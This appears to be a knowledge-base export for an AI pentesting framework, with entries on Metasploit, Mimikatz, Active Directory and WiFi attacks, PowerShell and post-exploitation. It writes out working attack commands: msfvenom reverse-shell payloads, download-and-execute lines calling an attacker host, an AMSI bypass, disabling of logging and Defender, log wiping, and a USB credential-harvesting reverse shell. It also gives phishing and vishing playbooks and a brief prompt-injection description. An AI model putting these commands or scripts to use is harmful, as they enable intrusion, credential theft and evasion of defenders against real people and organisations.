content: Steghide embeds hidden data inside image and audio files without visible changes. Used for covert data exfiltration and CTF challenges. SUPPORTED FORMATS: JPEG, BMP, WAV, AU (NOT PNG - use steghide only with JPEG/BMP). EMBED (HIDE): steghide embed -cf cover_image.jpg -sf secret.txt (prompts for passphrase). With passphrase: steghide embed -cf cover.jpg -sf secret.txt -p 'MyPassphrase'. Embed without compression: steghide embed -cf cover.jpg -sf secret.txt -z 0. EXTRACT (REVEAL): steghide extract -sf stego_image.jpg (prompts for passphrase). With passphrase: steghide extract -sf stego_image.jpg -p 'MyPassphrase' -xf output.txt. GET INFO: steghide info stego_image.jpg (shows embedded data size, encryption used). CRACK PASSPHRASE: stegseek cover.jpg rockyou.txt (FAST steg cracker - tries all passwords). Or: stegcracker image.jpg /usr/share/wordlists/rockyou.txt. OTHER STEG TOOLS: strings image.jpg (check for embedded text). exiftool image.jpg (metadata). binwalk image.jpg (embedded files). binwalk -e image.jpg (extract embedded files). foremost image.jpg (file carving). zsteg image.png (PNG/BMP LSB steg - different tool for PNG). stegsolve (GUI - shows bit planes). OpenStego, SilentEye (GUI tools). CTF WORKFLOW: 1. strings, 2. exiftool, 3. binwalk, 4. steghide info, 5. stegseek with rockyou.txt, 6. zsteg (if PNG), 7. stegsolve (visual analysis). COVERT CHANNEL USE: embed C2 instructions in JPEG files, exfiltrate data as 'innocent' photos.

title: Scan Web Servers with Nikto
content: Nikto is an open-source web server vulnerability scanner. Checks for 6700+ dangerous files/CGIs, outdated software, server configuration issues. BASIC SCAN: nikto -h http://target. HTTPS: nikto -h https://target -ssl. Custom port: nikto -h http://target:8080. SAVE OUTPUT: nikto -h target -o nikto_results.txt (auto-detect format from extension). nikto -h target -o results.xml -Format xml. nikto -h target -o results.html -Format html. AUTHENTICATION: Basic auth: nikto -h http://target -id admin:password. Cookie auth: nikto -h http://target -c 'PHPSESSID=abc123; auth=1'. SPECIFIC TUNING: -Tuning 1 (interesting files), -Tuning 2 (misconfigurations), -Tuning 3 (info disclosure), -Tuning 4 (injection - XSS/HTML), -Tuning 5 (remote file retrieval), -Tuning 6 (denial of service), -Tuning 8 (command execution), -Tuning 9 (SQL injection), -Tuning x (all). Combine: -Tuning 1234589. EVASION: -evasion 1 (random URI encoding), -evasion 2 (directory self-reference), -evasion 3 (premature URL ending), -evasion 4 (long random string), -evasion 8 (use Windows path separator). PROXY: nikto -h target -useproxy http://127.0.0.1:8080 (send through Burp). WHAT NIKTO FINDS: Default files/credentials, outdated Apache/IIS/nginx versions, dangerous HTTP methods (PUT/DELETE), CGI vulnerabilities, SSL issues, missing headers (X-Frame-Options, CSP, HSTS), directory indexing enabled, backup files (.bak, .old, ~). LIMITATIONS: Noisy (easily detected), not a replacement for manual testing or Burp Suite, many false positives. Always combine with gobuster, dirb, manual testing.

title: Metasploit Framework - Complete Reference
content: Metasploit is the industry standard exploitation framework. START: msfconsole (or msfdb init first to init database). WORKSPACE: workspace -a engagementname (separate engagements). DB IMPORT: db_import scan.xml (import nmap XML). hosts (list discovered hosts). services (list services). vulns (list identified vulns). SEARCH: search ms17_010, search type:exploit platform:windows, search cve:2021. USE MODULE: use exploit/windows/smb/ms17_010_eternalblue. info (module details). CONFIGURE: show options. set RHOSTS 192.168.1.100. set LHOST 192.168.1.50. set LPORT 4444. set PAYLOAD windows/x64/meterpreter/reverse_tcp. show payloads (list compatible). check (check if target vulnerable before exploit). EXPLOIT: run or exploit. METERPRETER: sysinfo, getuid (current user), getpid, getsystem (attempt SYSTEM), hashdump (dump SAM hashes), screenshot, keyscan_start/keyscan_dump, shell (drop to OS shell), ps (list processes), migrate PID (migrate to another process). PRIVILEGE ESCALATION: run post/multi/recon/local_exploit_suggester (find local privesc vectors). PERSISTENCE: run post/windows/manage/persistence_exe. POST MODULES: run post/windows/gather/credentials/credential_collector. run post/multi/recon/local_exploit_suggester. run post/windows/manage/enable_rdp. PIVOTING: run post/multi/manage/autoroute SUBNET=10.10.10.0/24. Socks proxy: use auxiliary/server/socks_proxy; set SRVPORT 1080; run (then proxychains nmap). PORT FORWARD: portfwd add -l 3389 -r 10.10.10.5 -p 3389. SESSIONS: sessions -l (list all). sessions -i 1 (interact). background (background current). PAYLOADS: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe. msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf. msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php.

title: Linux File System Layout
content: Key directories: / (root - if compromised, everything is). /etc (system config - crontab, sudoers, passwd, shadow, hosts, ssh/sshd_config, apache2/, nginx/). /var/log (logs - auth.log, syslog, apache2/access.log - wipe these after compromise). /home/user (personal files, SSH keys in .ssh/, bash_history, .profile). /root (root home - high value: .ssh/, .bash_history, .mysql_history). /tmp (world-writable, survives reboot NOT - drop payloads, linpeas here). /dev/shm (RAM filesystem - no disk writes, great for payload staging). /opt (optional software - often interesting custom apps). /var/www/html (web root - drop shells here if writable). /proc (virtual FS - /proc/self/environ for environment, /proc/version for kernel). /usr/share (wordlists, NSE scripts, payloads, web shells). /etc/passwd (user list, UID/GID, home dirs). /etc/shadow (password hashes - root readable only). /etc/sudoers (sudo rules - NOPASSWD entries = instant escalation). /etc/crontab (scheduled tasks). /var/backups (often contains old /etc/shadow, passwd copies). /usr/local/bin (custom binaries).

title: Essential Linux Commands for Security
content: NAVIGATION: pwd, ls -la (show hidden), ls -laR (recursive), cd, mkdir -p (create nested dirs). FILES: cat, less, head -20, tail -20, grep -r 'password' /etc/, find / -name '*.txt' 2>/dev/null, locate filename, strings binary (extract readable strings), file filename (identify type), xxd file | head (hex dump). NETWORK: ip a (interfaces), ip route (routing table), ss -tulnp (listening ports+processes), netstat -tulnp, curl -v url, wget url, nmap, nc (netcat), ping, traceroute. PROCESSES: ps aux (all processes), ps aux | grep root, top/htop, kill -9 PID, pgrep processname, lsof -i (files open by network), lsof -p PID. USERS: whoami, id, w (who's logged in), last (login history), cat /etc/passwd, sudo -l, su - username, adduser newuser, passwd user. PERMISSIONS: chmod 777 file, chmod +x script.sh, chown user:group file, umask. ARCHIVE: tar czf archive.tar.gz dir/ (create), tar xzf archive.tar.gz (extract), zip -r archive.zip dir/, unzip archive.zip. PIPE TRICKS: cat /etc/passwd | awk -F: '{print $1}' (extract usernames). grep -oP '(?<=Password: ).*' config.txt (extract passwords). sort | uniq (deduplicate). wc -l (count lines). REDIRECTION: > overwrite, >> append, 2>/dev/null (suppress errors), 2>&1 (merge stderr). TRANSFER: scp user@target:/remote/file ./local/, python3 -m http.server 8080 (serve files), wget http://attacker/file.

title: Windows Architecture and Key Components
content: NT Kernel: User mode (apps, limited hardware) and Kernel mode (OS core, full hardware, crashes = BSOD). NTFS: supports permissions (ACLs), encryption (EFS), alternate data streams (ADS - hide data: type evil.exe > legit.txt:evil.exe). Registry: HKLM (machine-wide), HKCU (current user), HKCC (hardware config), HKCR (file associations), HKU (all users). SAM (Security Account Manager): stores local NTLM password hashes at C:\Windows\System32\config\SAM. LSASS (Local Security Authority Subsystem): manages authentication, stores credentials in memory - target for mimikatz. WMI (Windows Management Instrumentation): powerful management framework, used for lateral movement and persistence. Active Directory: domain identity management. DC = Domain Controller. LDAP port 389. Kerberos port 88. SYSVOL and NETLOGON shares on DC. Group Policy Objects (GPOs) stored in SYSVOL. Security features: Defender (AV/EDR), AMSI (script scanning), UAC (elevation prompts), AppLocker/WDAC (app whitelist), Credential Guard (LSASS protection), BitLocker (full disk encrypt). Event logs: Security (4624=logon, 4625=failed logon, 4648=explicit creds, 4688=process create), System, Application, PowerShell. Registry run keys (persistence): HKCU\Software\Microsoft\Windows\CurrentVersion\Run.

title: Windows Authentication Attacks
content: NTLM auth flow: client sends username → server sends 8-byte challenge → client hashes challenge with NTLM hash → server verifies. ATTACK TECHNIQUES: Pass-the-Hash (PTH): use NTLM hash directly without knowing plaintext. crackmapexec smb target -u admin -H NTLM_HASH --exec-method wmiexec. impacket-psexec domain/user@target -hashes :NTLM_HASH. NTLM Relay: intercept + relay auth to different server. impacket-ntlmrelayx -tf targets.txt -smb2support. Responder (poisoning): responder -I eth0 -wPv (poisons LLMNR/NBT-NS/mDNS, captures NTLMv2 hashes). Crack captured hashes: hashcat -m 5600 hash.txt rockyou.txt (NTLMv2), hashcat -m 1000 hash.txt rockyou.txt (NTLM). Kerberoasting: GetUserSPNs.py domain/user:pass@DC -request (get TGS tickets for service accounts, crack offline). hashcat -m 13100 ticket.txt rockyou.txt. AS-REP Roasting: GetNPUsers.py domain/ -usersfile users.txt -no-pass (targets no-pre-auth accounts). DCSync: secretsdump.py domain/admin:pass@DC (mimics DC replication, dumps all hashes). Mimikatz: sekurlsa::logonpasswords (dump plaintext creds from LSASS), lsadump::sam (dump SAM), sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe. Golden Ticket: krbtgt hash + domain SID = forge any Kerberos ticket.

title: PowerShell for Security Operations
content: PowerShell is the most powerful Windows admin/attack tool. EXECUTION POLICY BYPASS: powershell -ep bypass, Set-ExecutionPolicy Bypass -Scope Process -Force, powershell -exec bypass -c 'command'. DOWNLOAD AND EXECUTE (fileless): IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1'). (IWR 'http://attacker/file' -OutFile C:\Temp\file.exe). RECON COMMANDS: Get-Process, Get-Service, Get-NetIPAddress, Get-NetTCPConnection (netstat), Get-LocalUser, Get-LocalGroup, Get-LocalGroupMember Administrators, Get-WmiObject Win32_ComputerSystem, Get-WmiObject Win32_OperatingSystem, Get-ChildItem -Recurse C:\Users\ -Filter *.txt 2>$null. CREDENTIAL HUNTING: findstr /si password *.txt *.ini *.config (CMD), Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'. AMSI BYPASS: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). CONSTRAINED LANGUAGE MODE CHECK: $ExecutionContext.SessionState.LanguageMode. LOGGING: PowerShell Script Block Logging (Event 4104), Module Logging, Transcription. Avoid by using encoded commands: powershell -enc BASE64_ENCODED_COMMAND. ENCODED COMMAND: $cmd='IEX(IWR url)'; $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); powershell -enc $encoded. DISABLE LOGGING (needs admin): Set-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0.

title: Active Directory Attacks
content: AD is the crown jewel of enterprise networks. ENUMERATION: BloodHound: SharpHound.exe -c All (collect), import into BloodHound, find paths to Domain Admin. PowerView: Get-NetDomain, Get-NetUser, Get-NetGroup, Get-NetComputer, Find-LocalAdminAccess. ldapdomaindump: python3 ldapdomaindump.py -u domain\user -p pass DC_IP. CrackMapExec: crackmapexec smb DC_IP -u user -p pass --users, --groups, --shares. COMMON ATTACK PATHS: 1. Kerberoasting → crack service account password → if admin = game over. 2. AS-REP Roasting → crack pre-auth disabled account. 3. Responder + NTLM relay → capture hash → PTH or crack. 4. GPP Passwords → find cpassword in SYSVOL/Policies/*.xml → gpp-decrypt to get plaintext. 5. ACL abuse → GenericAll/WriteDACL/WriteOwner rights → password reset or DCSync. 6. Pass-the-Hash → NTLM hash = authenticated access. 7. Silver Ticket → TGS for specific service. 8. Golden Ticket → krbtgt hash → unlimited access. LATERAL MOVEMENT: PsExec, WMIexec, SMBexec, RDP, WinRM (evil-winrm -i target -u admin -p password). PERSISTENCE: Add to Domain Admins, create backdoor user, scheduled task, registry run key, Golden Ticket (persists across password changes). DEFENSE EVASION: AMSI bypass, obfuscation, in-memory execution, signed binary proxy execution (LOLBAS).

title: Post-Exploitation Techniques
content: After initial access: stabilize shell, enumerate, escalate, persist, pivot, exfil, cover tracks. SHELL STABILIZATION (Linux): python3 -c 'import pty;pty.spawn("/bin/bash")' then Ctrl+Z, stty raw -echo, fg, export TERM=xterm. SITUATIONAL AWARENESS: Linux: id, whoami, hostname, uname -a, ip a, ss -tulnp, ps aux, cat /etc/passwd, sudo -l, env. Windows: whoami /all, systeminfo, ipconfig /all, net user, net localgroup administrators, netstat -ano, tasklist /svc. DATA COLLECTION: Linux: find /home -name '*.txt' -o -name '*.pdf' 2>/dev/null, cat ~/.bash_history, find / -name id_rsa 2>/dev/null. Windows: dir /s /b C:\Users\ *.doc *.pdf *.kdbx *.rdp, cmdkey /list, reg query 'HKCU\Software\SimonTatham\PuTTY\Sessions'. CREDENTIAL DUMPING: Mimikatz: sekurlsa::logonpasswords, lsadump::sam. Kali: crackmapexec smb target -u admin -p pass --sam (remote dump). LaZagne: lazagne.exe all (dumps all stored creds). PIVOTING: SSH tunnel: ssh -L local_port:internal_host:remote_port user@jump_host. Metasploit autoroute + socks proxy. Chisel: server: chisel server -p 8080 --reverse; client: chisel client attacker:8080 R:1080:socks. EXFILTRATION: scp, nc, curl POST to attacker, DNS exfil (iodine), ICMP tunneling. COVER TRACKS: Linux: history -c, unset HISTFILE, shred -u log_file, timestomp (touch -t). Windows: wevtutil cl Security, del %temp%\*, clearev (Meterpreter).

title: Hardware Platforms for Security Research
content: Raspberry Pi 5 (16GB): Full Linux, PCIe Gen 2, best portable attack platform. Needs Debian Trixie for Hailo-10H NPU support. Hailo-10H AI HAT+ 2: 40 TOPS neural accelerator for local AI inference. ESP32: WiFi/BT attacks, deauth, BLE scanning, low power, runs MicroPython. Flipper Zero: Sub-GHz RF (433/868/915MHz), NFC (13.56MHz), RFID 125kHz (HID/EM4100), IR transmitter/receiver, iButton, BadUSB, GPIO. WiFi Pineapple Nano: rogue AP, PineAP beacon flood, evil portal, KARMA attack, PMK capture. Default IP: 172.16.42.1:1471. LilyGo T-Display S3: ESP32-S3 with built-in color display, compact wireless attack platform. Alfa AWUS036ACH: RTL8812AU dual-band WiFi adapter, monitor mode + packet injection. Alfa AWUS036NHA: AR9271 single-band, excellent Linux compatibility. USB Rubber Ducky (Hak5): HID injection, DuckyScript payloads. RP2040 (Pi Pico): programmable as custom BadUSB via pico-ducky or CircuitPython. O.MG Cable: looks like USB-A cable, executes payloads when plugged in. Shark Jack: portable network reconnaissance and attack tool. LAN Turtle: covert network implant for remote access.

title: ERR0RS ULTIMATE - Project Architecture
content: ERR0RS ULTIMATE is an AI-powered penetration testing framework for Kali Linux and Parrot OS. Vision: Clippy for offensive security - fully interactive, completely local, no data leaves the OS, professional business-scale production. Stack: Python + FastAPI + Uvicorn backend, ChromaDB for RAG knowledge base, Ollama for local LLM (Pi5/offline build), Anthropic Claude API for personal build. 120+ Kali/Parrot tool integrations, HTML/PDF reporting engine, ethical guardrails, natural language interface, modular agent architecture. GitHub: github.com/Gnosisone. Debian packaged. Hardware: Pi 5 16GB + Hailo-10H AI HAT+ 2 (40 TOPS) + Geekworm X1004 NVMe HAT. Modules built: BadUSB Studio (src/tools/badusb_studio/), Pineapple Studio (src/tools/pineapple/). Tool modules: exploitation/metasploit_tool.py, passwords/hydra_tool.py, recon/nmap_tool.py, web/gobuster_tool.py, web/nikto_tool.py, web/sqlmap_tool.py.

title: ERR0RS BadUSB Studio - RP2040 Programmer Module
content: ERR0RS BadUSB Studio at src/tools/badusb_studio/. Turns any RP2040 into a custom BadUSB. Files: badusb_studio.py (orchestrator), payload_browser.py (Hak5 PayloadHub + local), payload_generator.py (AI gen + templates), ducky_converter.py (DuckyScript to CircuitPython), rp2040_flasher.py (auto-detect + flash). Firmware modes: pico-ducky (DUCKY drive, drop payload.txt), CircuitPython (CIRCUITPY drive, drop code.py). Bootloader: hold BOOTSEL + plug in = RPI-RP2 drive. Hak5 PayloadHub: fetches from github.com/hak5/usbrubberducky-payloads via GitHub API, categories: credentials/recon/exfil/etc, caches locally. Payload Studio: opens payloadstudio.hak5.org, exports for manual import (free tier). AI generator: natural language to DuckyScript or CircuitPython. Templates: wifi harvest, reverse shell, browser creds, generic. DuckyScript converter: DELAY/STRING/STRINGLN/GUI/CTRL_SHIFT/ALT to adafruit_hid. Quick: studio.quick_program('description') auto-generates and flashes. Usage: from src.tools.badusb_studio import BadUSBStudio; studio = BadUSBStudio(); studio.connect(); studio.browse_hak5(); studio.generate('harvest wifi'); studio.flash_ducky(). Compatible: Pi Pico, Pi Pico W, Pi Pico 2, Waveshare RP2040 Zero, Adafruit Feather RP2040.

title: ERR0RS WiFi Pineapple Nano Integration
content: ERR0RS Pineapple Studio at src/tools/pineapple/. Full WiFi Pineapple Nano integration. Files: pineapple_client.py (REST API auth + HTTP), pineap_engine.py (PineAP daemon), recon.py (site survey + clients + handshakes), modules_manager.py (Evil Portal, DNSspoof, urlsnarf, tcpdump, MacChanger), pineapple_studio.py (orchestrator + campaigns). Connection: IP 172.16.42.1 port 1471, POST /api/login returns Bearer token. title: Duckie Harvest - USB Rubber Ducky Credential Harvester
content: Duckie Harvest uses ATTACKMODE HID STORAGE (dual keyboard + storage). PASSIVE_WINDOWS_DETECT counts USB config requests (Windows=2, Linux=7), waits for LED lock replay. Attack chain: WIN+R → powershell → CTRL+SHIFT+ENTER (admin) → LEFT+ENTER (UAC yes). Finds drive via Win32_LogicalDisk CIM. Three-layer Defender kill: DisableRealtimeMonitoring + ExclusionPath + ExclusionExtension ps1. Harvests: Chrome/Brave/Edge Login Data + Local State (AES key), Firefox logins.json + key4.db + cookies, WiFi via netsh key=clear (plaintext passwords), system recon (ComputerInfo/Process/Service/NetIPAddress). Reverse shell via TCPClient outbound (bypasses inbound firewall). Re-enables Defender on cleanup. ~15-20 seconds total. Config: $DRIVE (USB label), $IP (attacker IP), $PORT (listener port). Defense: USB whitelisting via GPO, UAC Always Notify, Tamper Protection, PS Script Block Logging, Credential Guard.

title: Cybersecurity Certifications Roadmap
content: ENTRY LEVEL: CompTIA Tech+ (ITF+ replacement), A+ (hardware/OS), Network+ (networking), Security+ (DoD 8570 baseline, widely required). PRACTICAL OFFENSIVE: eJPT (eLearnSecurity Junior Pentester - first hands-on cert, highly recommended for beginners). PNPT (TCM Security Practical Network Pentester - excellent value, real-world report writing). eCPPT (eLearnSecurity Certified Professional Pentester). GOLD STANDARD: OSCP (Offensive Security Certified Professional - most respected in industry, 24hr exam in live lab, requires Buffer Overflow + multiple machine compromises). ADVANCED: OSEP (evasion + AD), OSED (exploit dev), OSWE (web expert), CRTO (Cobalt Strike red team ops). MANAGEMENT/GRC: CISSP (senior roles), CISM, CISA. CEH (EC-Council): theory-heavy, widely listed in job postings but less respected than practical certs. BEST PATH FOR EROS: Security+ (baseline, have Tech+) → eJPT (first hands-on) → PNPT (practical + report writing) → OSCP (gold standard) → CRTO or OSEP (advanced red team).

title: Mimikatz - Windows Credential Extraction Complete Reference
content: Mimikatz is a post-exploitation tool targeting Windows authentication. It reads credential data from lsass.exe (Local Security Authority Subsystem Service). WHAT IT TARGETS: NTLM hashes, Kerberos tickets, WDigest plaintext passwords (legacy), DPAPI keys, SAM database. WHAT IT DOES NOT DO: WiFi passwords, WPA2 cracking, Linux credentials, web passwords — Mimikatz is Windows-only and auth-protocol-specific. REQUIREMENTS: Must have Administrator or SYSTEM privileges. lsass.exe must be accessible (Credential Guard or PPL blocks it). CORE WORKFLOW: 1. Run as Administrator. 2. privilege::debug (enables SeDebugPrivilege to access lsass memory). 3. Choose extraction module. MAIN MODULES: sekurlsa::logonpasswords (dumps everything: NTLM hashes, plaintext if WDigest enabled, Kerberos tickets, DPAPI keys from all logged-on sessions). sekurlsa::wdigest (WDigest plaintext only — works pre-Win8.1 or if re-enabled via registry). sekurlsa::tickets (list Kerberos TGTs and TGS tickets in memory). sekurlsa::pth /user:Administrator /domain:CORP /ntlm:HASH /run:cmd.exe (Pass-the-Hash — spawn process as user using hash, no plaintext needed). lsadump::sam (dump local SAM database — requires SYSTEM). lsadump::lsa /patch (patch LSA and dump all secrets including service account creds). lsadump::dcsync /domain:corp.local /user:krbtgt (DCSync — mimic DC replication to pull any account hash without touching lsass — needs Domain Admin). kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-X /krbtgt:HASH (forge Golden Ticket — unlimited domain access). OFFLINE DUMP METHOD (stealthier): rundll32.exe comsvcs.dll MiniDump <lsass_pid> C:\temp\lsass.dmp full — then on your machine: sekurlsa::minidump lsass.dmp then sekurlsa::logonpasswords. DETECTION: Sysmon Event 10 (lsass process access), Windows Event 4624/4648 (logon), AMSI telemetry on mimikatz strings. DEFENSES: Credential Guard (virtualizes lsass), Protected Users group, PPL (Protected Process Light) on lsass, disable WDigest registry key.

title: WiFi Password Recovery and WPA2 Cracking - Complete Reference
content: CRITICAL DISTINCTION: How you attack WiFi depends entirely on your situation. Three completely different paths. PATH 1 — MACHINE ALREADY HAS SAVED WIFI: If you have access to a Windows machine that previously connected to the network, no cracking needed. netsh wlan show profiles (list all saved networks). netsh wlan show profile name='NetworkName' key=clear (shows Key Content = plaintext password). PowerShell all networks: (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $n = ($_ -split ':')[1].Trim(); netsh wlan show profile name=$n key=clear | Select-String 'Key Content' }. Linux NetworkManager: cat /etc/NetworkManager/system-connections/*.nmconnection | grep psk. PATH 2 — CAPTURE AND CRACK WPA2 HANDSHAKE: Step 1: airmon-ng check kill then airmon-ng start wlan0 (enable monitor mode — requires adapter that supports it like Alfa AWUS036ACM). Step 2: airodump-ng wlan0mon (survey). Step 3: airodump-ng -c CHANNEL --bssid TARGET_AP_MAC -w capture wlan0mon (capture packets). Step 4: Force handshake with deauth: aireplay-ng -0 5 -a TARGET_AP_MAC -c CLIENT_MAC wlan0mon. Step 5: Convert: hcxpcapngtool -o capture.hc22000 capture-01.cap. Step 6: Crack: hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt. Or with rules: hashcat -m 22000 capture.hc22000 rockyou.txt -r /usr/share/hashcat/rules/best64.rule. Or aircrack-ng (CPU, slower): aircrack-ng capture-01.cap -w rockyou.txt. PATH 3 — PMKID ATTACK (clientless): hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 then hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng then hashcat -m 22000 pmkid.hc22000 rockyou.txt. No clients needed. WEP (legacy): airodump-ng + aireplay-ng ARP replay + aircrack-ng — trivially broken. WHY MIMIKATZ DOES NOT WORK ON WIFI: Mimikatz targets Windows NTLM/Kerberos auth protocols inside lsass.exe. WPA2 uses PBKDF2-HMAC-SHA1 key derivation — completely different algorithm, completely different storage location. Mimikatz has no WiFi module. HARDWARE NEEDED: Monitor mode + packet injection adapter required. Alfa AWUS036ACM (MT7612U dual-band) or Alfa AWUS036NHA (AR9271 2.4GHz). Built-in laptop WiFi almost never supports monitor mode.

title: WiFi vs Windows Credentials - Tool Selection Guide
content: ERR0RS teaching note: The single most common student mistake is reaching for the wrong tool for the credential type. This entry is the authoritative decision tree. DECISION TREE — What are you trying to get? 1. WiFi password AND you already have access to a Windows machine that connected to it → netsh wlan show profile name='SSID' key=clear. No hacking needed. Takes 5 seconds. 2. WiFi password AND you have a .cap packet capture file → hashcat -m 22000 or aircrack-ng. NOT Mimikatz. 3. WiFi password AND you have NO capture AND you're near the AP → airmon-ng + airodump-ng + aireplay-ng to capture handshake, THEN hashcat. 4. Windows user passwords / NTLM hashes → Mimikatz sekurlsa::logonpasswords or lsadump::sam. NOT aircrack. 5. Windows domain account hashes → Mimikatz lsadump::dcsync. NOT wireless tools. 6. Web browser saved passwords → LaZagne, SharpChromium, SharpWeb. Neither Mimikatz nor aircrack. HASH TYPE REFERENCE — These are completely different algorithms: WPA2 handshake hash = PBKDF2-HMAC-SHA1 (hashcat mode 22000). NTLM hash = MD4 of UTF-16LE password (hashcat mode 1000). NTLMv2 net hash = captured challenge-response (hashcat mode 5600). Kerberos TGS (Kerberoasting) = RC4-HMAC or AES (hashcat mode 13100 or 19600). WEP = RC4 stream cipher — broken by IV statistical attack, not dictionary. NEVER mix these — running aircrack against an NTLM hash does nothing. Running hashcat mode 1000 against a WPA2 capture does nothing.

title: The AI Threat Paradigm Shift — Criminal AI Democratizes Attacks
content: AI has fundamentally changed the threat landscape by democratizing sophisticated attack capability. WormGPT and FraudGPT are subscription criminal AI tools on dark web forums. Key stats: 1,265% increase in phishing following ChatGPT launch (SlashNext 2023), 4,151% increase in malicious emails since Q4 2022 (Darktrace 2023). Criminal AI gives attackers perfect phishing in any language in 30 seconds, custom malware in minutes, personalized SE at scale. The barrier dropped from nation-state resources to $200/month. 91% of attacks begin with phishing — AI makes every phish better.

title: WormGPT — Criminal AI Tool Threat Profile
content: WormGPT is an uncensored LLM (GPT-J based) fine-tuned on malware datasets. First documented July 2023. Capabilities: BEC generation (researchers called output remarkably persuasive), malware assistance (polymorphic code, payload obfuscation, EDR evasion), phishing at scale (hundreds of unique variants in all languages). Zero guardrails, no refusals. Defense: AI-powered email security (behavioral detection, not signature), DMARC p=reject, FIDO2 phishing-resistant MFA, wire transfer dual-authorization, out-of-band verification for financial requests. Process controls beat content detection for AI-generated attacks.

title: FraudGPT — Financial Fraud Criminal AI Tool
content: FraudGPT is a subscription criminal AI ($200/month) for financial fraud. Documented by Netenrich August 2023. Capabilities: fake banking portals, vishing scripts for finance impersonation, SMS smishing (98% open rate), carding assistance, scam page generation. 3,000+ claimed sales. Defense: FIDO2 keys won't authenticate to fake domains, password managers won't autofill on lookalike domains, DNS filtering, employee training with actual FraudGPT output examples. Process: never click SMS links from financial institutions.

title: Deepfake Fraud — AI Voice and Video Impersonation
content: Deepfake fraud clones executive voices and video for real-time impersonation. Hong Kong 2024: $25.6M stolen — employee attended video call where all participants including CFO were deepfakes. Voice cloning requires 3 seconds of audio, available for $30/month, real-time quality. Video deepfake real-time swap now possible. Defense: executive code word system for financial requests, out-of-band callback on known number (not calling number), financial cooling periods and multi-person authorization, AI deepfake detection tools (Intel FakeCatcher, Microsoft Video Authenticator, C2PA standard).

title: Prompt Injection — Attacking Enterprise AI Systems
content: Prompt injection embeds malicious instructions in data that enterprise AI systems process — the AI equivalent of SQL injection. MITRE ATLAS AML.T0051. Attack scenarios: email with hidden instructions for AI email assistant to forward all CEO emails to attacker; malicious code comments executed by AI code reviewer; poisoned data source for enterprise RAG systems. Defense: treat all AI input as untrusted, privilege separation (email summarizer cannot send emails), human-in-the-loop for consequential actions, output filtering, sandboxed AI agents.

title: MITRE ATLAS — AI Attack Framework
content: MITRE ATLAS maps attack techniques against AI systems. Key techniques: AML.T0043 Craft Adversarial Data (poison AI email filters), AML.T0051 LLM Prompt Injection (embed instructions in AI-processed data), AML.T0020 Poison Training Data (corrupt RAG/model training), AML.T0040 ML Model API Access (extract training data), AML.T0047 Develop Capabilities (WormGPT/FraudGPT creation). Mapping for defenders: WormGPT BEC=T0047, Prompt Injection=T0051, Deepfake=T0047+T1566, Training Poison=T0020. Use ATLAS as common language with leadership and vendors.

title: Briefing Fortune 500 Boards on AI Cyber Threats
content: Executive AI threat briefing framework. Financial risk: BEC average $125K/incident, ransomware average $812K payment, deepfake fraud documented $25.6M single incident, data breach average $4.45M. Regulatory: SEC 2023 requires 4-day material incident disclosure and board-level oversight; board directors face personal liability. The elevator pitch: sophisticated attacks used to require sophisticated attackers — AI ended that. Immediate investments: DMARC p=reject, FIDO2 MFA, wire transfer dual-auth. Most powerful demo: show quality gap between old phishing and AI-generated phishing side-by-side. Run authorized phishing simulation showing click rates — boards respond to their own organization's numbers.

title: Social Engineering — The Human Variable
content: Social engineering exploits human psychology rather than technical vulnerabilities. Verizon DBIR consistently shows 74-82% of breaches involve a human element. The brain's cognitive shortcuts — authority bias, social proof, scarcity, reciprocity, liking, commitment/consistency — are the real attack surface. Cialdini's 6 Principles of Influence are the scientific foundation of every SE attack. Technology cannot be patched against social engineering — only trained, empowered humans can resist it. Attack taxonomy: Digital (phishing, vishing, smishing, BEC), Physical (tailgating, impersonation, USB drops, badge cloning), Hybrid (most effective), Insider. Kevin Mitnick's core insight: you don't need to break encryption if you can simply ask someone for the password.

title: Phishing — Email Social Engineering Complete Reference
content: Phishing types: Mass phishing (5-10% catch rate), Spear phishing (60-70% with OSINT personalization), Whaling (C-suite targeting), BEC (compromised/spoofed exec email), Clone phishing (duplicate real email, swap link), Vishing (voice), Smishing (SMS). Infrastructure needs: lookalike domain aged 30+ days with SPF/DKIM/DMARC, SMTP relay (SendGrid/SES), cloned landing page capturing creds, per-target tracking links. Tools: GoPhish (campaign management, open-source), Evilginx2 (MFA bypass via reverse proxy — captures session tokens), SET (credential harvester, site cloner), Zphisher. GoPhish workflow: Groups → Templates → Landing Pages → Sending Profile → Campaign → Monitor. Evilginx2 capability: bypasses TOTP and push MFA by capturing authenticated session cookies in real time. Deliverability tips: age domain, set SPF/DKIM/DMARC, warm up IP, avoid spam keywords, use HTTPS, try QR codes to bypass URL scanners.

title: Vishing — Voice Phishing and Phone-Based Social Engineering
content: Vishing (voice phishing) uses phone calls to extract credentials, reset passwords, or gain physical access. Voice builds trust faster than text and enables real-time course correction. Call framework: Hook (establish authority 0-10s), Rapport (use name, be calm), Pretext (believable scenario with real details), Yes Ladder (small agreements before big ask), Elicitation (extract objective naturally), Close (exit with fake ticket number). Yes Ladder example: 'Confirm you're at workstation?' Yes → 'Logged in?' Yes → 'Nothing unusual today?' No → 'Can you confirm your username?' [gives it]. Caller ID spoofing tools: SpoofCard, SpoofTel, Twilio API, Asterisk PBX. Pretexts: IT helpdesk security incident, HR payroll verification, corporate auditor, vendor maintenance. Elicitation techniques: bracketing (give wrong info to get real info), flattery (compliment expertise), quid pro quo (offer first), appeal to ego. Key insight: technical intimidation using jargon makes targets defer to 'the expert' even when they don't understand what's being said.

title: Physical Social Engineering — Tailgating, Impersonation, Physical Access
